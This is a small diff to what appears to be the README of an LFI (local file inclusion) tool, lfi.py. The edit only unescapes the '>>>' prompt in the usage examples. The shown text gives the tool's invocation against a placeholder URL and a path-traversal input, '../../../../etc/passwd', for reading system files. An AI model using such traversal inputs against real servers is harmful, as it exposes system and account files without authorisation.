@@ -47,11 +47,11 @@ python3 lfi.py 'http://target.com/page.php?file=' -o output.txt
 
 After starting the tool, you'll enter interactive mode:
 ```
-shell \>\>\>
+shell >>>
 ```
 Type the filename you want to fetch:
 ```
-shell \>\>\> ../../../../etc/passwd
+shell >>> ../../../../etc/passwd
 ```
 Type `exit` or `quit` to close the tool.
 
